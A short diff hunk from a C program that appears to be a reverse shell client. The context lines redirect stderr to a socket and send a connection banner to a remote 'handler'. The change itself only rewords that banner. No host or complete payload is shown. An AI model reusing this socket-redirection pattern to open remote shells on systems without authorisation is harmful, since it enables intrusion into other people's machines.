@@ -78,7 +78,7 @@ int main(int argc, char *argv[])
 		dup2(sock, 2);	//stderr moved to socket
 
 		//sending output to handler to show connection
-		strcpy(buff, "This is a linux client writing to socket\n");
+		strcpy(buff, "Connection made from linux client\n");
 		write(sock, buff, strlen(buff));
 		//now we will start getting into the gritty stuff
 
